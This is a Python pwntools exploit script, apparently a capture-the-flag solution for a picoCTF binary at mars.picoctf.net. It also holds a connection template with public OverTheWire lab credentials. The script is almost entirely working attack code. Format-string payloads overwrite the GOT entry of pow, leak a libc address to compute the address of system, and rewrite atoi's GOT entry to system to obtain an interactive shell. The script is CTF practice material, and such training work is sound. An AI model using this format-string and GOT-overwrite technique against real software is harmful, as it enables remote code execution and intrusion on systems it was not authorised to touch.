from pwn import *
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './chall'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = '' #ELF('/lib/x86_64-linux-gnu/libc.so.6') #Set library path when know it



if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('mars.picoctf.net',31929) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *0x4009d2')



##########################
##### OFFSET FINDER ######
##########################

def send_payload(payload):
        P = remote('mars.picoctf.net',31929)
        P.sendlineafter(b'A: ',b'1'+payload)
        P.sendlineafter(b'B: ', b'10')
        r = P.recvline()
        P.close()
        print(r)
        return r



#####################
#### Find Gadgets ###
#####################

MAIN_PLT = ELF_LOADED.symbols['main']

GOT_POW = ELF_LOADED.got['pow']
GOT_ATOI = ELF_LOADED.got['atoi']
log.info('Main start: ' + hex(MAIN_PLT))
log.info('POW got: ' + hex(GOT_POW))
#####################
### Final Payload ###
#####################
context.clear(arch = 'amd64',endian='little')


payload = b'%2083c%12$hnaaa'+p64(GOT_POW)
log.info('Payload: ' + payload.decode())



P.sendlineafter(b'A: ',b'1'+payload)
P.sendlineafter(b'B: ',b'2'+b'.%109$p')
P.recvuntil(b'and B: 2.')

leak = int(P.recvline().strip(),16)
libc_base = leak - 0x0270b3 
system = libc_base + 0x055410
system_write = system % 0x1000000
system_write1 = system_write % 0x100 +0x100 -0x28
system_write2 = int(system_write / 0x100) -0x110



log.info('Libc start: ' + hex(libc_base))
log.info('system: ' + hex(system))
log.info('system write 1: ' + hex(system_write1))
log.info('system write 2: ' + hex(system_write2))


P.sendlineafter(b'A: ',b'12345678'+p64(GOT_ATOI)+p64(GOT_ATOI+1))
P.sendlineafter(b'B: ',f'2.%{system_write1}c%11$hhn%{system_write2}c%12$hn')

P.interactive()



